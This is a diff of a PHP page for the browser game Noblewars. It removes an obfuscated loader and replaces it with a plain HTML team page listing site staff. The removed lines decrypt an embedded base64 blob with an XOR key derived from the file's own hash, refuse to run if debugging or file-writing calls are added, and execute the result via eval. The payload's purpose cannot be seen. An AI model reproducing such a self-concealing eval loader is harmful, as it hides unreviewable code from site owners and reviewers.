@@ -1,24 +1,67 @@
 <?php
-$fukstfo="d70e9959a52c1a8173423594f4f0f1ec";
-$pxajowdk="500f03550a0e0d5b53060a5b070200010555030002510a00030604025e055c51";
-$wffuihmfp="TOKOZ+hZ21QiTs9verZVrTb20grsxIMRYHMUOTzsj+laLvYOOoN8KV4bqnNnFbR1LZxiT14bn3c4UAUZY34y5rRVbdZBD5tRccpvEmVA19xeYlDCy8PEgwqdg9T1a4aNT09IQz4ZxEKlr1awGBPnK2/jFM26MwzquU8aySIGqkGoj0ykF9YwktEoXgA7npMwkI5TnvtBVMWhYvB9kqnIG2i9yJZOmO7Khworz5ZKN6wQ9e32lGUlf4RyxNsSRGt/YP5R/50iprqe++I2EZvbsOtMLQodQxrBe+44/1PY3+Yk/F+keAiuDi8LD2ouSbRLtSw59sRIQzgYAvwP7DbbPuVpIIyMzPafRFRRN5e6SmpW8q3kRsEuIyA5dbUmJzBPrGy4WPHA0jLLeKFULegxazEtJ4uk6N+yNt1e6/U9Kknfd8Wcfp0HuZ8XisvmRDWqKG9R7rBuSdRJex6tUm2zVmpSTcIrahOKH2Bv4BKuHo+YkiO2RVFmoH0K/XyHttDwPUXmKmGFWOR7Aj+KGkcXPW/mplg/ivZAzyz+QhfpE8YJumy0xXiElHYCH30nWzpDqXRch9IEtLG4fpDcWMDRX8TM2ZjRpKCNBpB6KefAbplo0PZ4Wy7ROCtsuhWxNRCSLnkj8rgC2UcPtnd41S/6yAMTVKoFNiAsXlNXn1zZ5bQnIQZu81jwz0wrLlat2y2n9qp2gQVXOPzsfPtCk+0lwZgmJTP9ggN5IQIXK7yvR0XJFSNrQTofR0A38JnIDChbvdS/OvleVMa8qcq4jOtGOESptd349LQdX6Cf8eMzjzwZb0JcrRR9WnsfeUWgxGjYSslhh10GAsmDTsB20jTYal9UctgJZ9vNqdl1nUTtS/d4B4qS6zlBLbqJyaDLNRXonRlKK5ZUyYhgLnAEEDWKNrWjA1e0jVRqU1n3RSJpRPRiexXimeRY+6vGoGVc+L/ahaHI9xIPw4SLtLQGYVaEa0AbGnqWh7MncCni+o+bFIOvJ13OBRifHoz54178BExQ/bFz2tbP1CaJdeQnqAS9mIxmJx7ECZXiySo4c7QqH2o/X4NRuv46ZSl/T8gdfytxwJCfFMozPVJKvVjiqgvuM37S0nHCeio8FQorkKA3ix4CcHEDEDId7uKm5v3PwoT2MnIhmTRP9ElraPPHnbTlDZfIpGrSCt6c2x+WMAnsC5Gwlqw7MpJUfLWBmGd6FolHVL+85X1Kxijbjt6OBGQIZCZztu4cL9Id3EV/Yr9Xftb1vXX1Q7Phihgc6WBrE8UIolKIMCiivHpIAcZoiUjEyTVKgGIMcN5Pph23d8q94I9dC8eNybnVGcd48ucmpHhC";
-$tvshapsnv=file_get_contents(__FILE__);
-$xzuzdta=str_replace($wffuihmfp,"",$tvshapsnv);
-if(strpos($xzuzdta,"ec"."ho")!==false||strpos($xzuzdta,"pr"."int")!==false||strpos($xzuzdta,"var_"."dump")!==false||strpos($xzuzdta,"file_put_"."contents")!==false||strpos($xzuzdta,"fw"."rite")!==false){die();}
-$nahwwhew=str_replace(array($fukstfo,$pxajowdk),array("SP_a9c8e268","KP_5a3792a9"),$tvshapsnv);
-$wzgnkg=md5($nahwwhew);
-$nipfkujbtgd=hex2bin($pxajowdk);
-$nfdrvpw="";
-$mmowrcwkdde=strlen($wzgnkg);
-for($ymiiarhl=0;$ymiiarhl<$mmowrcwkdde;$ymiiarhl++){
-$nfdrvpw.=chr(ord($nipfkujbtgd[$ymiiarhl])^ord($wzgnkg[$ymiiarhl]));
-}
-$murppzxd=base64_decode($wffuihmfp);
-$bzqpnxzq=strlen($murppzxd);
-$srrdoqof="";
-$uygqfn=strlen($nfdrvpw);
-for($ymiiarhl=0;$ymiiarhl<$bzqpnxzq;$ymiiarhl++){
-$srrdoqof.=$murppzxd[$ymiiarhl]^$nfdrvpw[$ymiiarhl%$uygqfn];
-}
-$hxrafoarbgq="gzun"."compress";
-eval('?>' . $hxrafoarbgq($srrdoqof) . '<?php ');
+/**
+ * EQUIPA CLÁSSICA - Noblewars
+ */
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title><?= __('public.team.title') ?> - Noblewars</title>
+    <link rel="shortcut icon" href="graphic/icons/nwfavicon.ico" type="image/x-icon" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" type="text/css" href="css/index.css" />
+</head>
+<body>
+    <div id="index_body">
+        <div id="main">
+            <div id="header">
+                <h1><a href="index.php" style="background:url(graphic/index/bg-noble2.jpg) no-repeat 100% 0;"><p style="position: absolute; top: -300px">Noblewars</p></a></h1>
+                <div class="navigation">
+                    <div class="navigation-holder">
+                        <div class="navigation-wrapper">
+                            <div id="navigation_span">
+                                <?php foreach ($linki as $link => $value) { echo '<a href="' . $link . '">' . $value . '</a> - '; } ?>
+                                <span style="float: right; margin-right: 10px;">
+                                    <?php include __DIR__ . '/components/language_selector_public.php'; ?>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <span class="paladin"><img src="graphic/index/bg-ice41.png" alt="" /></span>
+            </div>
+
+            <div id="content">
+                <div class="container-block-full">
+                    <div class="container-top-full"></div>
+                    <div class="container">
+                        <div class="info-block register">
+                            <h2 class="register"><?= __('public.team.heading') ?></h2>
+                            <br /><br />
+                            <h3 style="font-weight: bold;"><?= __('public.team.support_note') ?></h3>
+
+                            <div style="margin-top: 50px;">
+                                <h2><?= __('public.team.management_title') ?></h2>
+                                <br /><br />
+                                <table class="vis">
+                                    <tr>
+                                        <th width="300"><?= __('public.team.table.name') ?></th>
+                                        <th width="250"><?= __('public.team.table.role') ?></th>
+                                    </tr>
+                                    <tr><td>Admin</td><td><?= __('public.team.roles.admin_role') ?></td></tr>
+                                    <tr><td>Moderador</td><td><?= __('public.team.roles.moderator_role') ?></td></tr>
+                                    <tr><td><a href="ice41.pt">Ice41</a></td><td><?= __('public.team.roles.tech_dev') ?></td></tr>
+                                </table>
+                                <br />
+                                <p style="margin-top: 20px; color: #666;"><?= __('public.team.footer_note') ?></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="container-bottom-full"></div>
+                </div>
+            </div>
+            <div class="closure">&copy; <?= date('Y') ?> · by ice41 - NobleWars</div>
+        </div>
+    </div>
+</body>
+</html>
